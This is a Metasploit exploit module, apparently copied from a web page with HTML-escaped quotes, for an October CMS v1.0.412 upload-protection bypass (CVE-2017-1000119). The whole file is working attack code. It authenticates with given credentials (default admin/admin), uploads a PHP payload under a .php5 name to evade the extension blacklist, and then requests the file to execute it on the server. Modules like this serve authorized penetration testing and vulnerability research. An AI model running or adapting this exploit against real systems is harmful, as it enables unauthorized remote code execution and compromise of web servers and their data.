# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;October CMS Upload Protection Bypass Code Execution&#039;,
      &#039;Description&#039; => %q{
          This module exploits an Authenticated user with permission to upload and manage media contents can
          uploading PHP code by checking the file extension. It uses black-list based
          approach, as seen in octobercms/vendor/october/rain/src/Filesystem/
          Definitions.php:blockedExtensions().
          This module was tested on October CMS version v1.0.412 on Ubuntu.
      },
      &#039;Author&#039; =>
        [
          &#039;Anti RÃ¤is&#039;, # Discovery
          &#039;Touhid M.Shaikh <touhidshaikh22[at]gmail.com>&#039;, # Metasploit Module
          &#039;SecureLayer7.net&#039; # Metasploit Module
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [&#039;EDB&#039;,&#039;41936&#039;],
          [&#039;URL&#039;,&#039;https://bitflipper.eu/finding/2017/04/october-cms-v10412-several-issues.html&#039;],
          [&#039;CVE&#039;,&#039;2017-1000119&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039;     => false,
          &#039;ENCODER&#039; => &#039;php/base64&#039;,
        },
      &#039;Privileged&#039; => false,
      &#039;Platform&#039;   => [&#039;php&#039;],
      &#039;Arch&#039;       => ARCH_PHP,
      &#039;Targets&#039; =>
        [
          [ &#039;October CMS v1.0.412&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Apr 25 2017&#039;))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "Base October CMS directory path", &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [ true, "Username to authenticate with", &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ true, "Password to authenticate with", &#039;admin&#039;])
      ])
  end

  def uri
    return target_uri.path
  end

  def check
    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(uri, &#039;modules&#039;, &#039;system&#039;, &#039;assets&#039;, &#039;js&#039;, &#039;framework.js&#039;)
      })
    rescue
      vprint_error(&#039;Unable to access the /assets/js/framework.js file&#039;)
      return CheckCode::Unknown
    end

    if res && res.code == 200
      return Exploit::CheckCode::Appears
    end

    return CheckCode::Safe
  end

  def login
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;backend&#039;, &#039;backend&#039;, &#039;auth&#039;, &#039;signin&#039;),
      &#039;method&#039; => &#039;GET&#039;
    })

    if res.nil?
      fail_with(Failure::Unreachable, "#{peer} - Connection failed")
    end

    /name="_session_key" type="hidden" value="(?<session>[A-Za-z0-9"]+)">/ =~ res.body
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine Session Key") if session.nil?

    /name="_token" type="hidden" value="(?<token>[A-Za-z0-9"]+)">/ =~ res.body
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine token") if token.nil?
    vprint_good("Token for login : #{token}")
    vprint_good("Session Key for login : #{session}")

    cookies = res.get_cookies
    vprint_status(&#039;Trying to Login ......&#039;)

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;backend&#039;, &#039;backend&#039;, &#039;auth&#039;, &#039;signin&#039;),
      &#039;cookie&#039; => cookies,
      &#039;vars_post&#039; => Hash[{
        &#039;_session_key&#039; => session,
        &#039;_token&#039; => token,
        &#039;postback&#039; => &#039;1&#039;,
        &#039;login&#039; => datastore[&#039;USERNAME&#039;],
        &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
      }.to_a.shuffle]
    })

    fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request") if res.nil?

    # if we redirect. then we assume we have authenticated cookie.
    if res.code == 302
      print_good("Authentication successful: #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}")
      store_valid_credential(user: datastore[&#039;USERNAME&#039;], private: datastore[&#039;PASSWORD&#039;])
      return cookies
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Authentication Failed :[ #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]} ]")
    end
  end


  def exploit
    cookies = login

    evil = "<?php #{payload.encoded} ?>"
    payload_name = "#{rand_text_alpha(8..13)}.php5"

    post_data = Rex::MIME::Message.new
    post_data.add_part("/", content_type = nil, transfer_encoding = nil, content_disposition = &#039;form-data; name="path"&#039;)
    post_data.add_part(evil, content_type = &#039;application/x-php&#039;, transfer_encoding = nil, content_disposition = "form-data; name=\"file_data\"; filename=\"#{payload_name}")  #payload
    data = post_data.to_s

    register_files_for_cleanup(payload_name)
    vprint_status("Trying to upload malicious #{payload_name} file ....")
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;backend&#039;, &#039;cms&#039;, &#039;media&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookies,
      &#039;headers&#039; => { &#039;X-OCTOBER-FILEUPLOAD&#039; => &#039;MediaManager-manager&#039; },
      &#039;Connection&#039; => &#039;close&#039;,
      &#039;data&#039; => data,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{post_data.bound}"
    })

    send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;storage&#039;, &#039;app&#039;, &#039;media&#039;, payload_name),
      &#039;method&#039; => &#039;GET&#039;
    })
  end
end

